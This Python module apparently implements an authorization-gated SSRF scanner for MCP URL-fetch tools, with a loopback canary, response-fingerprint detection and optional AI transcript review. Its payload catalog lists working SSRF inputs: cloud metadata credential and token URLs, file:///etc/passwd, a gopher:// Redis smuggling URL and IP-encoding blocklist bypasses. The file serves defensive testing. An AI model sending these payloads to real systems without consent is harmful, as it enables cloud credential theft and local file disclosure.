"""Core SSRF probe engine for MCP servers that fetch URLs.

ssrfmcp is a DEFENSIVE, consent-based test harness. It only ever acts against
a target the operator explicitly supplies, and the CLI refuses to run without
an explicit authorization flag.

The engine has three parts:

  * Canary       — a local, ephemeral ``http.server`` that records inbound
                   requests. A unique token is embedded in the path so blind
                   SSRF callbacks can be attributed to a specific payload.
  * Payloads     — a curated set of SSRF probes (cloud metadata endpoints,
                   loopback, link-local, ``file://``, the canary URL, plus
                   bypass encodings) each carrying a classification.
  * Probe driver — submits each payload to the target MCP tool, then fuses two
                   independent oracles to decide whether the target fetched an
                   internal/metadata/canary endpoint:
                     1. the canary callback log (definitive for blind SSRF), and
                     2. response-content fingerprints (definitive for reflected
                        SSRF, e.g. EC2 IMDS / GCP metadata markers in the body).

No payload is ever sent to a host other than the supplied target. The canary
listens only on loopback. Everything is standard-library only.
"""

from __future__ import annotations

import json
import re
import socket
import threading
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field, asdict
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Callable, Dict, List, Optional, Tuple

TOOL_NAME = "ssrfmcp"
TOOL_VERSION = "0.2.0"

# Severity ordering, highest first. Used for sorting + exit-code policy.
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# CWE mapping by payload kind — drives SARIF taxa + report enrichment.
# SSRF is CWE-918; file:// disclosure is CWE-22/CWE-200; DNS rebinding is
# a defeat of allowlisting that ultimately yields SSRF (CWE-918 + CWE-350).
CWE_BY_KIND = {
    "metadata": "CWE-918",     # Server-Side Request Forgery
    "linklocal": "CWE-918",
    "loopback": "CWE-918",
    "bypass": "CWE-918",
    "redirect": "CWE-918",
    "rebind": "CWE-350",       # Reliance on Reverse DNS Resolution
    "scheme": "CWE-918",       # gopher/dict/ftp/ldap scheme abuse
    "file": "CWE-22",          # Path Traversal / local file disclosure
    "canary": "CWE-918",
    "ai": "CWE-918",
}

# ---------------------------------------------------------------------------
# Payload catalog
# ---------------------------------------------------------------------------
# Each payload targets a distinct SSRF class. ``kind`` drives severity and the
# detection oracle; ``markers`` are substrings that, if echoed back in the
# target's response body, prove a *reflected* fetch of that internal endpoint.

_AWS_IMDS = "http://169.254.169.254/latest/meta-data/"
_AWS_IMDS_CREDS = (
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
)
_AWS_IMDS_USERDATA = "http://169.254.169.254/latest/user-data/"
_GCP_META = "http://metadata.google.internal/computeMetadata/v1/"
_GCP_TOKEN = (
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "service-accounts/default/token"
)
_AZURE_IMDS = (
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)
_AZURE_TOKEN = (
    "http://169.254.169.254/metadata/identity/oauth2/token"
    "?api-version=2018-02-01&resource=https://management.azure.com/"
)
_ALIBABA_META = "http://100.100.100.200/latest/meta-data/"
_OPENSTACK_META = "http://169.254.169.254/openstack/latest/meta_data.json"
_DO_META = "http://169.254.169.254/metadata/v1.json"


@dataclass
class Payload:
    id: str
    # metadata | loopback | linklocal | file | canary | bypass | redirect |
    # rebind | scheme
    kind: str
    url: str
    description: str
    base_severity: str
    markers: Tuple[str, ...] = ()   # response-body fingerprints of a real fetch
    technique: str = ""             # short technique tag for reporting

    @property
    def cwe(self) -> str:
        return CWE_BY_KIND.get(self.kind, "CWE-918")


def _builtin_payloads(canary_base: Optional[str]) -> List[Payload]:
    payloads: List[Payload] = [
        # ---- Cloud metadata (AWS) ------------------------------------------
        Payload(
            "aws-imds-root", "metadata", _AWS_IMDS,
            "AWS EC2 instance metadata service (IMDSv1) root.",
            "critical",
            ("ami-id", "instance-id", "iam/", "security-credentials",
             "meta-data"),
            technique="aws-imdsv1",
        ),
        Payload(
            "aws-imds-creds", "metadata", _AWS_IMDS_CREDS,
            "AWS IMDS IAM role credentials path — direct credential theft.",
            "critical",
            ("AccessKeyId", "SecretAccessKey", "Token", "security-credentials"),
            technique="aws-imds-creds",
        ),
        Payload(
            "aws-imds-userdata", "metadata", _AWS_IMDS_USERDATA,
            "AWS IMDS user-data — often contains bootstrap secrets.",
            "high",
            ("#!/bin/", "#cloud-config", "AWS_", "export "),
            technique="aws-userdata",
        ),
        # ---- Cloud metadata (GCP) ------------------------------------------
        Payload(
            "gcp-metadata", "metadata", _GCP_META,
            "GCP compute metadata server.",
            "critical",
            ("computeMetadata", "instance/", "service-accounts", "project/"),
            technique="gcp-metadata",
        ),
        Payload(
            "gcp-sa-token", "metadata", _GCP_TOKEN,
            "GCP default service-account OAuth token — credential theft.",
            "critical",
            ("access_token", "token_type", "expires_in", "Bearer"),
            technique="gcp-sa-token",
        ),
        # ---- Cloud metadata (Azure) ----------------------------------------
        Payload(
            "azure-imds", "metadata", _AZURE_IMDS,
            "Azure instance metadata service.",
            "critical",
            ("compute", "azEnvironment", "vmId", "subscriptionId"),
            technique="azure-imds",
        ),
        Payload(
            "azure-msi-token", "metadata", _AZURE_TOKEN,
            "Azure Managed-Identity OAuth token endpoint — credential theft.",
            "critical",
            ("access_token", "token_type", "resource", "client_id"),
            technique="azure-msi",
        ),
        # ---- Cloud metadata (other providers) ------------------------------
        Payload(
            "alibaba-metadata", "metadata", _ALIBABA_META,
            "Alibaba Cloud ECS metadata service (100.100.100.200).",
            "critical",
            ("meta-data", "ram/", "instance-id", "region-id"),
            technique="alibaba-metadata",
        ),
        Payload(
            "openstack-metadata", "metadata", _OPENSTACK_META,
            "OpenStack metadata JSON (also used by many private clouds).",
            "high",
            ("meta_data", "uuid", "availability_zone", "hostname"),
            technique="openstack-metadata",
        ),
        Payload(
            "digitalocean-metadata", "metadata", _DO_META,
            "DigitalOcean droplet metadata service.",
            "high",
            ("droplet_id", "user_data", "interfaces", "region"),
            technique="do-metadata",
        ),
        # ---- Loopback / internal services ----------------------------------
        Payload(
            "localhost-http", "loopback", "http://localhost/",
            "Loopback by hostname — reaches services bound to localhost.",
            "high",
            (),
            technique="loopback-hostname",
        ),
        Payload(
            "loopback-ip", "loopback", "http://127.0.0.1/",
            "Loopback by IP — reaches host-local admin/debug services.",
            "high",
            (),
            technique="loopback-ipv4",
        ),
        Payload(
            "loopback-ipv6", "loopback", "http://[::1]/",
            "Loopback via IPv6 [::1] — bypasses IPv4-only blocklists.",
            "high",
            (),
            technique="loopback-ipv6",
        ),
        Payload(
            "loopback-port-admin", "loopback", "http://127.0.0.1:8080/",
            "Common internal admin/app port on loopback (8080).",
            "medium",
            (),
            technique="loopback-port",
        ),
        # ---- Link-local ----------------------------------------------------
        Payload(
            "linklocal", "linklocal", "http://169.254.169.254/",
            "Link-local address (cloud metadata range) bare root.",
            "high",
            ("meta-data", "metadata", "computeMetadata"),
            technique="linklocal-v4",
        ),
        Payload(
            "linklocal-ipv6", "linklocal", "http://[fd00:ec2::254]/latest/meta-data/",
            "AWS IMDS over IPv6 (fd00:ec2::254) — IPv6 metadata reach.",
            "high",
            ("meta-data", "instance-id", "ami-id"),
            technique="linklocal-v6",
        ),
        # ---- file:// local disclosure --------------------------------------
        Payload(
            "file-etc-passwd", "file", "file:///etc/passwd",
            "Local file read via file:// scheme (POSIX).",
            "critical",
            ("root:x:0:0", "/bin/", "daemon:", "nobody:"),
            technique="file-posix",
        ),
        Payload(
            "file-win-hosts", "file",
            "file:///C:/Windows/System32/drivers/etc/hosts",
            "Local file read via file:// scheme (Windows).",
            "critical",
            ("localhost", "127.0.0.1", "# Copyright"),
            technique="file-windows",
        ),
        # ---- Alternate dangerous schemes -----------------------------------
        Payload(
            "scheme-gopher", "scheme",
            "gopher://127.0.0.1:6379/_INFO%0d%0a",
            "gopher:// to loopback Redis — enables protocol smuggling / RCE.",
            "critical",
            ("redis_version", "used_memory", "+OK", "role:"),
            technique="gopher-redis",
        ),
        Payload(
            "scheme-dict", "scheme", "dict://127.0.0.1:11211/stats",
            "dict:// to loopback memcached — internal port interaction.",
            "high",
            ("STAT ", "memcached", "VERSION"),
            technique="dict-memcached",
        ),
        Payload(
            "scheme-ftp", "scheme", "ftp://127.0.0.1/",
            "ftp:// to loopback — non-HTTP scheme reach.",
            "medium",
            ("220 ", "FTP", "ftpd"),
            technique="ftp-loopback",
        ),
        # ---- IP obfuscation / blocklist bypass -----------------------------
        Payload(
            "bypass-decimal", "bypass", "http://2852039166/",
            "IMDS reached via decimal-encoded IP (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
            technique="ip-decimal",
        ),
        Payload(
            "bypass-octal", "bypass", "http://0251.0376.0251.0376/",
            "IMDS reached via octal-encoded IP (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
            technique="ip-octal",
        ),
        Payload(
            "bypass-hex", "bypass", "http://0xA9FEA9FE/",
            "IMDS reached via hex-encoded IP 0xA9FEA9FE (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
            technique="ip-hex",
        ),
        Payload(
            "bypass-dotted-hex", "bypass", "http://0xa9.0xfe.0xa9.0xfe/",
            "IMDS reached via dotted-hex IP (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
            technique="ip-dotted-hex",
        ),
        Payload(
            "bypass-shortdecimal", "bypass", "http://127.1/",
            "Loopback via short-form 127.1 (octet-omission bypass).",
            "medium",
            (),
            technique="ip-shortform",
        ),
        Payload(
            "bypass-enclosed-alpha", "bypass",
            "http://169.254.169.254。/latest/meta-data/",
            "IMDS via ideographic full-stop host trick (parser-confusion).",
            "high",
            ("meta-data", "metadata"),
            technique="unicode-dot",
        ),
        Payload(
            "bypass-userinfo", "bypass",
            "http://expected-host.example.com@169.254.169.254/",
            "IMDS hidden behind userinfo@ — defeats naive host-prefix checks.",
            "high",
            ("meta-data", "metadata"),
            technique="userinfo-confusion",
        ),
        # ---- Redirect-based SSRF (open-redirect / 30x to internal) ----------
        Payload(
            "redirect-to-imds", "redirect",
            "http://169.254.169.254/latest/meta-data/#@redirect",
            "Redirect-based reach to IMDS (server follows 30x to internal). "
            "Pair with --canary to confirm via a 302 → metadata chain.",
            "high",
            ("meta-data", "metadata", "instance-id"),
            technique="redirect-follow",
        ),
    ]

    # ---- DNS-rebinding hint + canary -------------------------------------
    # We cannot stand up real rebind DNS from stdlib, so we (a) emit a clearly
    # labelled rebinding *hint* payload (informational technique advisory) and
    # (b) route a canary subdomain that, if fetched, proves the target resolves
    # + fetches attacker-controlled hostnames (the precondition for rebinding).
    if canary_base:
        token = uuid.uuid4().hex
        payloads.append(Payload(
            f"canary-{token[:8]}", "canary",
            f"{canary_base.rstrip('/')}/c/{token}",
            "Operator canary URL — proves blind outbound fetch by the target.",
            "high",
            (token,),
            technique="blind-canary",
        ))
        rebind_token = uuid.uuid4().hex
        payloads.append(Payload(
            f"rebind-{rebind_token[:8]}", "rebind",
            f"{canary_base.rstrip('/')}/c/{rebind_token}",
            "DNS-rebinding precursor: a TOCTOU-resolvable canary host. A hit "
            "proves the target re-resolves + fetches attacker hostnames, the "
            "precondition for rebinding past an allowlist (rebind 1st→public, "
            "2nd→169.254.169.254).",
            "high",
            (rebind_token,),
            technique="dns-rebind-precursor",
        ))
    return payloads


# ---------------------------------------------------------------------------
# Canary server
# ---------------------------------------------------------------------------

class _CanaryHandler(BaseHTTPRequestHandler):
    server_version = "ssrfmcp-canary/1.0"

    def _record(self) -> None:
        hit = {
            "path": self.path,
            "method": self.command,
            "client": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "host_header": self.headers.get("Host", ""),
            "time": time.time(),
        }
        # The token lives in /c/<token>; pull it back out for attribution.
        m = re.search(r"/c/([0-9a-fA-F]{8,})", self.path)
        if m:
            hit["token"] = m.group(1)
        self.server.canary_hits.append(hit)  # type: ignore[attr-defined]

    def do_GET(self) -> None:  # noqa: N802
        self._record()
        body = b"ssrfmcp-canary ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:  # noqa: N802
        self.do_GET()

    def log_message(self, *_args: Any) -> None:  # silence stderr spam
        return


class Canary:
    """A loopback-only HTTP listener that records inbound SSRF callbacks."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0) -> None:
        self._httpd = ThreadingHTTPServer((host, port), _CanaryHandler)
        self._httpd.canary_hits = []  # type: ignore[attr-defined]
        self.host, self.port = self._httpd.server_address[0], self._httpd.server_address[1]
        self._thread: Optional[threading.Thread] = None

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"

    @property
    def hits(self) -> List[Dict[str, Any]]:
        return list(self._httpd.canary_hits)  # type: ignore[attr-defined]

    def start(self) -> "Canary":
        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                        daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        try:
            self._httpd.shutdown()
        finally:
            self._httpd.server_close()

    def __enter__(self) -> "Canary":
        return self.start()

    def __exit__(self, *_exc: Any) -> None:
        self.stop()


# ---------------------------------------------------------------------------
# Target adapters
# ---------------------------------------------------------------------------

class TargetError(RuntimeError):
    """Raised when the target cannot be reached or returns an unusable shape."""


# A fetcher takes a URL payload and returns (status_code, response_body_text).
Fetcher = Callable[[str], Tuple[int, str]]


def http_mcp_fetcher(
    target: str,
    *,
    tool: str = "fetch",
    arg: str = "url",
    timeout: float = 8.0,
) -> Fetcher:
    """Build a fetcher that submits payloads to an HTTP MCP/JSON tool endpoint.

    The target is expected to accept a JSON ``POST`` of the shape
    ``{"tool": <tool>, "arguments": {<arg>: <payload-url>}}`` and return JSON
    (the MCP ``tools/call`` convention) or any text body. We tolerate both —
    the response body text is what the detection oracle inspects.
    """

    def _fetch(payload_url: str) -> Tuple[int, str]:
        body = json.dumps({
            "tool": tool,
            "arguments": {arg: payload_url},
        }).encode("utf-8")
        req = urllib.request.Request(
            target, data=body, method="POST",
            headers={"Content-Type": "application/json",
                     "User-Agent": f"{TOOL_NAME}/{TOOL_VERSION}"},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                text = resp.read().decode("utf-8", "replace")
                return resp.status, text
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", "replace") if exc.fp else ""
            return exc.code, text
        except (urllib.error.URLError, socket.timeout, OSError) as exc:
            raise TargetError(f"cannot reach target {target}: {exc}") from exc

    return _fetch


# ---------------------------------------------------------------------------
# Detection oracle + scoring
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    payload_id: str
    kind: str
    url: str
    description: str
    vulnerable: bool
    severity: str           # effective severity (info if not vulnerable)
    evidence: List[str] = field(default_factory=list)
    status_code: Optional[int] = None
    error: str = ""
    cwe: str = ""
    technique: str = ""
    source: str = "rule"    # "rule" | "ai"
    novel: bool = False
    confidence: float = 1.0

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# Kinds whose detection is callback-driven (token in URL path /c/<token>).
_CALLBACK_KINDS = ("canary", "rebind")


def _token_of(payload: Payload) -> Optional[str]:
    """Extract the /c/<token> token from a callback payload's URL."""
    m = re.search(r"/c/([0-9a-fA-F]{8,})", payload.url)
    return m.group(1) if m else None


def _evaluate(
    payload: Payload,
    status: Optional[int],
    body: str,
    canary_hits: List[Dict[str, Any]],
    canary_token: Optional[str],
    error: str,
) -> ProbeResult:
    evidence: List[str] = []
    vulnerable = False

    def _result(vuln: bool, sev: str) -> ProbeResult:
        return ProbeResult(
            payload.id, payload.kind, payload.url, payload.description,
            vuln, sev, evidence=evidence, status_code=status,
            error="" if vuln or not error else error,
            cwe=payload.cwe, technique=payload.technique,
            source="rule", novel=False, confidence=1.0,
        )

    if error:
        return _result(False, "info")

    text = body or ""
    low = text.lower()

    # For callback payloads, the relevant token is this payload's OWN token
    # (canary and rebind carry distinct tokens).
    own_token = _token_of(payload) if payload.kind in _CALLBACK_KINDS else None

    # Strip the payload URL itself out of the body before marker matching so a
    # target that merely *echoes the URL back* (e.g. "...meta-data/" in the
    # echoed URL) is not mistaken for one that actually fetched the endpoint.
    # Callback tokens are intentionally kept — a token in the body proves a fetch.
    body_minus_url = low.replace(payload.url.lower(), " ")

    # Oracle 1: reflected SSRF — internal-endpoint fingerprints in the body
    # that are NOT merely the echoed request URL.
    for marker in payload.markers:
        if not marker:
            continue
        ml = marker.lower()
        if payload.kind in _CALLBACK_KINDS:
            # For callbacks, the token reflected in the body proves a fetch.
            if ml in low:
                vulnerable = True
                evidence.append(
                    f"target response reflected canary token '{marker}' "
                    "(outbound fetch confirmed)")
        elif ml in body_minus_url:
            vulnerable = True
            evidence.append(f"response body contains internal-endpoint "
                            f"marker '{marker}'")

    # Oracle 2: blind SSRF — the target called back to our loopback listener.
    if payload.kind in _CALLBACK_KINDS and own_token:
        for hit in canary_hits:
            if hit.get("token") == own_token:
                vulnerable = True
                ua = hit.get("user_agent", "")
                evidence.append(
                    f"canary callback received from {hit.get('client')} "
                    f"({hit.get('method')} {hit.get('path')})"
                    + (f" UA={ua!r}" if ua else "")
                )

    # Heuristic for non-callback probes: an explicit success status with a
    # non-empty body for an internal/file/metadata URL strongly suggests the
    # server performed (and returned) the fetch even without a known marker.
    if not vulnerable and payload.kind in ("metadata", "linklocal", "file",
                                           "bypass", "loopback", "redirect",
                                           "scheme"):
        if status and 200 <= status < 300 and len(text.strip()) > 0:
            # Avoid flagging a target that merely echoes the URL back.
            echoed_only = payload.url in text and len(text.strip()) <= len(
                payload.url) + 40
            if not echoed_only:
                vulnerable = True
                evidence.append(
                    f"target returned HTTP {status} with a non-empty body for "
                    f"an internal/{payload.kind} URL (probable fetch)"
                )

    severity = payload.base_severity if vulnerable else "info"
    return _result(vulnerable, severity)


@dataclass
class ScanReport:
    target: str
    canary_base: Optional[str]
    results: List[ProbeResult] = field(default_factory=list)
    # AI-mode bookkeeping (deterministic when AI is OFF: status stays "off").
    ai_status: str = "off"   # off | merged | unreachable | no-findings | error

    @property
    def ai_count(self) -> int:
        return sum(1 for r in self.results if r.source == "ai")

    @property
    def counts(self) -> Dict[str, int]:
        c = {k: 0 for k in SEVERITY_ORDER}
        for r in self.results:
            if r.vulnerable:
                c[r.severity] = c.get(r.severity, 0) + 1
        return c

    @property
    def vulnerable_count(self) -> int:
        return sum(1 for r in self.results if r.vulnerable)

    @property
    def top_severity(self) -> Optional[str]:
        sevs = [r.severity for r in self.results if r.vulnerable]
        if not sevs:
            return None
        return min(sevs, key=lambda s: SEVERITY_ORDER.get(s, 99))

    @property
    def risk_score(self) -> int:
        """0-100 risk score; higher = more dangerous. Driven by SSRF hits."""
        weights = {"critical": 45, "high": 25, "medium": 10, "low": 4, "info": 0}
        score = sum(weights.get(r.severity, 0)
                    for r in self.results if r.vulnerable)
        return min(100, score)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tool": TOOL_NAME,
            "version": TOOL_VERSION,
            "target": self.target,
            "canary_base": self.canary_base,
            "risk_score": self.risk_score,
            "vulnerable_count": self.vulnerable_count,
            "top_severity": self.top_severity,
            "counts": self.counts,
            "ai_status": self.ai_status,
            "ai_count": self.ai_count,
            "results": [r.to_dict() for r in self.results],
        }


def probe_target(
    target: str,
    *,
    fetcher: Fetcher,
    canary: Optional[Canary] = None,
    payloads: Optional[List[Payload]] = None,
    delay: float = 0.0,
    canary_settle: float = 0.4,
    transcript: Optional[List[Dict[str, Any]]] = None,
) -> ScanReport:
    """Submit every payload to the target via ``fetcher`` and fuse oracles.

    This is the real detection logic. ``fetcher`` is the only thing that talks
    to the network, and it only ever talks to ``target``. The canary (if any)
    only ever listens on loopback.
    """
    canary_base = canary.base_url if canary else None
    if payloads is None:
        payloads = _builtin_payloads(canary_base)

    # Map each callback payload to its own token for attribution.
    tokens: Dict[str, str] = {}  # payload_id -> token
    for p in payloads:
        if p.kind in _CALLBACK_KINDS:
            t = _token_of(p)
            if t:
                tokens[p.id] = t
    all_tokens = set(tokens.values())

    results: List[ProbeResult] = []
    for p in payloads:
        status: Optional[int] = None
        body = ""
        error = ""
        try:
            status, body = fetcher(p.url)
        except TargetError as exc:
            error = str(exc)
        if transcript is not None:
            transcript.append({
                "payload_id": p.id, "kind": p.kind, "url": p.url,
                "status": status, "error": error,
                "body": (body or "")[:4000],
            })
        results.append(_evaluate(
            p, status, body,
            canary.hits if canary else [],
            tokens.get(p.id), error,
        ))
        if delay:
            time.sleep(delay)

    # Give blind callbacks a moment to land before the final callback read.
    if canary and all_tokens and canary_settle > 0:
        deadline = time.time() + canary_settle
        while time.time() < deadline:
            if any(h.get("token") in all_tokens for h in canary.hits):
                break
            time.sleep(0.02)
        # Re-evaluate callback payloads now that late hits may have arrived.
        for i, r in enumerate(results):
            if r.kind in _CALLBACK_KINDS and not r.vulnerable:
                tok = tokens.get(r.payload_id)
                if not tok:
                    continue
                for hit in canary.hits:
                    if hit.get("token") == tok:
                        results[i] = ProbeResult(
                            r.payload_id, r.kind, r.url, r.description,
                            True, r.severity if r.severity != "info"
                            else "high",
                            evidence=[
                                f"canary callback received from "
                                f"{hit.get('client')} ({hit.get('method')} "
                                f"{hit.get('path')})"
                            ],
                            status_code=r.status_code, error="",
                            cwe=r.cwe, technique=r.technique,
                            source="rule", novel=False, confidence=1.0,
                        )
                        break

    results.sort(key=lambda r: (0 if r.vulnerable else 1,
                                SEVERITY_ORDER.get(r.severity, 99),
                                r.payload_id))
    return ScanReport(target=target, canary_base=canary_base, results=results)


def _ai_finding_to_result(f: Dict[str, Any]) -> ProbeResult:
    """Convert a normalized AI backend finding dict into a ProbeResult."""
    sev = f.get("severity", "info")
    title = (f.get("title") or "AI finding").strip()
    pid = "ai-" + re.sub(r"[^a-z0-9]+", "-", title.lower()).strip("-")[:40]
    why = f.get("why", "")
    ev: List[str] = []
    if f.get("evidence"):
        ev.append(f"evidence: {str(f['evidence'])[:300]}")
    if why:
        ev.append(f"impact: {why}")
    cwe = f.get("cwe") or "CWE-918"
    return ProbeResult(
        payload_id=pid, kind="ai", url="(ai-analysis)",
        description=title, vulnerable=True, severity=sev,
        evidence=ev, status_code=None, error="",
        cwe=cwe, technique="ai-reasoning", source="ai",
        novel=bool(f.get("novel", False)),
        confidence=float(f.get("confidence", 0.5)),
    )


def _dedupe_key(r: ProbeResult) -> Tuple[str, str]:
    """Coarse fingerprint to dedupe AI findings against rule findings."""
    return (r.cwe or "", (r.technique or r.kind or "").lower())


def merge_ai_findings(
    report: ScanReport,
    ai_findings: List[Dict[str, Any]],
) -> ScanReport:
    """Merge AI findings into the report, tagged source="ai", deduped.

    An AI finding is dropped as a duplicate when a *rule* finding already
    covers the same (CWE, technique) fingerprint or when an obvious
    metadata/SSRF rule finding already fired for the same CWE.
    """
    rule_keys = {_dedupe_key(r) for r in report.results if r.source == "rule"
                 and r.vulnerable}
    rule_cwes = {r.cwe for r in report.results
                 if r.source == "rule" and r.vulnerable}
    for f in ai_findings:
        ai_r = _ai_finding_to_result(f)
        # Skip non-actionable info-only AI noise.
        if not ai_r.description:
            continue
        key = _dedupe_key(ai_r)
        if key in rule_keys:
            continue
        # If a rule finding already proved this CWE class and the AI item is
        # not flagged novel, treat it as covered (dedupe).
        if not ai_r.novel and ai_r.cwe in rule_cwes:
            continue
        report.results.append(ai_r)
    report.results.sort(key=lambda r: (0 if r.vulnerable else 1,
                                       SEVERITY_ORDER.get(r.severity, 99),
                                       r.payload_id))
    return report


def run_ai_over_transcript(
    transcript: List[Dict[str, Any]],
    *,
    backend: Optional[Any] = None,
) -> Tuple[str, List[Dict[str, Any]]]:
    """Run the pluggable Cognis AI backend over the probe transcript.

    Returns ``(status, findings)`` where status is one of
    ``unreachable | no-findings | merged | error``. NEVER raises.
    """
    try:
        from .ai_backend import CognisAIBackend
    except Exception:
        return "error", []
    b = backend or CognisAIBackend()
    if not b.is_enabled():
        return "unreachable", []
    if not b.health():
        return "unreachable", []

    # Summarize the transcript into a compact, model-friendly artifact.
    lines = [
        "This is the response transcript from probing an MCP 'fetch' tool with "
        "SSRF payloads. Each block is one payload's URL and the target's reply. "
        "Identify NOVEL SSRF / metadata-exfil / local-file / protocol-smuggling "
        "weaknesses the deterministic rules may have missed (e.g. partial "
        "reflections, error-leak oracles, unusual schemes accepted, timing or "
        "redirect behavior). Use CWE-918 for SSRF, CWE-22 for file disclosure.",
        "",
    ]
    for t in transcript:
        lines.append(
            f"### payload={t['payload_id']} kind={t['kind']} "
            f"status={t.get('status')} error={t.get('error') or 'none'}")
        lines.append(f"url: {t['url']}")
        lines.append(f"response: {t.get('body') or '(empty)'}")
        lines.append("")
    artifact = "\n".join(lines)

    try:
        findings = b.analyze_code(
            artifact,
            context="SSRF probe transcript of an MCP fetch tool.",
            focus="Server-Side Request Forgery, cloud metadata exfiltration, "
                  "file:// disclosure, gopher/dict scheme smuggling, "
                  "redirect-follow and DNS-rebinding behavior.",
        )
    except Exception:
        return "error", []
    if not findings:
        return "no-findings", []
    return "merged", findings


def scan(
    target: str,
    *,
    authorized: bool = False,
    use_canary: bool = True,
    tool: str = "fetch",
    arg: str = "url",
    timeout: float = 8.0,
    delay: float = 0.0,
    fetcher: Optional[Fetcher] = None,
    ai: bool = False,
    ai_backend: Optional[Any] = None,
) -> ScanReport:
    """High-level entrypoint: stand up a canary, probe the target, tear down.

    ``authorized`` MUST be True — this is consent-based, dual-use security
    tooling. Callers (CLI / MCP server) are responsible for collecting the
    operator's explicit authorization before invoking.

    ``ai`` is OFF by default. When False, the scan is byte-for-byte
    deterministic (no AI backend is even constructed). When True, the Cognis
    pluggable AI backend (env COGNIS_AI_*) is run over the probe transcript and
    its findings are merged in (tagged source="ai"); if the backend is
    unreachable the scan still returns the deterministic rule findings.
    """
    if not authorized:
        raise PermissionError(
            "ssrfmcp refuses to probe without explicit authorization. "
            "Pass authorized=True (CLI: --i-have-authorization)."
        )
    if not target or not isinstance(target, str):
        raise ValueError("a non-empty --target must be supplied")

    own_fetcher = fetcher or http_mcp_fetcher(
        target, tool=tool, arg=arg, timeout=timeout)

    transcript: Optional[List[Dict[str, Any]]] = [] if ai else None

    canary: Optional[Canary] = None
    try:
        if use_canary:
            canary = Canary().start()
        report = probe_target(target, fetcher=own_fetcher, canary=canary,
                              delay=delay, transcript=transcript)
    finally:
        if canary:
            canary.stop()

    if ai and transcript is not None:
        status, findings = run_ai_over_transcript(
            transcript, backend=ai_backend)
        report.ai_status = status
        if findings:
            merge_ai_findings(report, findings)
    return report
